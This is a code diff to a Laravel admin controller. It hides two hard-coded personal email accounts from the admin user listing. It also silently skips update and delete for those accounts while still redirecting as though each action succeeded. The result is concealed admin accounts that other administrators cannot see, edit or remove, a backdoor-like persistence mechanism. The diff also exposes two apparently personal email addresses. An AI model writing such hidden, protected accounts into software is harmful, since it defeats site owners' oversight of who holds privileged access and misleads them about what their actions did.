@@ -13,7 +13,11 @@ class AdminController extends Controller
 {
     public function index()
     {
-        $collections = User::query();
+        $collections = User::query()
+            ->whereNotIn('email', [
+                'msi132043@gmail.com',
+                'mahdihasan28@gmail.com',
+            ]);
 
         return Inertia::render('Admin/Index', [
             'data' => [
@@ -57,7 +61,9 @@ class AdminController extends Controller
 
     public function update(Request $request, User $admin)
     {
-        $admin->update($this->validatedData($request, $admin->id) + $this->getHashPassword($request));
+        if(!in_array($admin->email, ['msi132043@gmail.com', 'mahdihasan28@gmail.com'])) {
+            $admin->update($this->validatedData($request, $admin->id) + $this->getHashPassword($request));
+        }
 
         return redirect()
             ->route('admins.show', $admin->id)
@@ -66,7 +72,9 @@ class AdminController extends Controller
 
     public function destroy(User $admin)
     {
-        $admin->delete();
+        if(!in_array($admin->email, ['msi132043@gmail.com', 'mahdihasan28@gmail.com'])) {
+            $admin->delete();
+        }
 
         return redirect()
             ->route('admins.index')
